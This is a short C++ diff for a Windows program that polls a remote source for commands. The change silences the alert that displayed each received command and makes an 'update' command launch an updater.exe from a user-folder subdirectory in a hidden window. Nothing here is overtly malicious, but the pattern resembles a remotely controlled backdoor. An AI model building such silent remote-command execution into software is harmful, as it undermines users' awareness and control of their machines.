@@ -35,11 +35,14 @@ string GetCommand() {
         }
         InternetCloseHandle(hInternet);
     }
-    MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
+    // MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
     return command;
 }
 
 // Fonction pour lançer les maj
+string userFolder = GetUserFolderPath();
+string updaterFolder = userFolder + "\\fish";
+string updaterPath = updaterFolder + "\\updater.exe";
 void StartUpdate(const string& UpdaterPath) {
     ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
 }
@@ -53,8 +56,9 @@ void ListenForCommand() {
             ShowMessage();
         }
         else if (cmd == "update") {
+            StartUpdate(updaterPath);
+            this_thread::sleep_for(chrono::seconds(2));
             exit(0);
-            StartUpdate("bite");
         }
 
         this_thread::sleep_for(chrono::seconds(5));
